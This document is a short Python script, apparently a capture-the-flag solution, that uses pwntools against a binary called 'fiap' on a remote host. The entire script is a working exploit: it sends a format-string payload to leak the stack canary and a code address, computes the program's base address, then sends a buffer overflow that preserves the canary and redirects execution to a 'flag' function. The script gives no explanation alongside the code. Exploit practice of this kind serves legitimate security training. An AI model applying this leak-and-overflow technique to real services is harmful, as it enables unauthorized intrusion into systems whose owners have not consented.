from pwn import *

r=remote("95.216.233.106",15021)
#r=process("./fiap")

b=ELF("./fiap")
context.log_level='debug'

flag=b.symbols['flag']
main=b.symbols['main']

pay1=""
pay1+='%11$x'+','+'%15$x'

r.sendafter("name?",pay1+'\n')
r.recvuntil("you, ")

canary=int(r.recv(8),16)
r.recv(1)
main113=int(r.recv(8),16)

base=main113-113-main
flag+=base

pay2=""
pay2+='x'*(0x25-0xc)
pay2+=p32(canary)
pay2+='x'*12
pay2+=p32(flag)

r.sendline(pay2)

r.interactive()
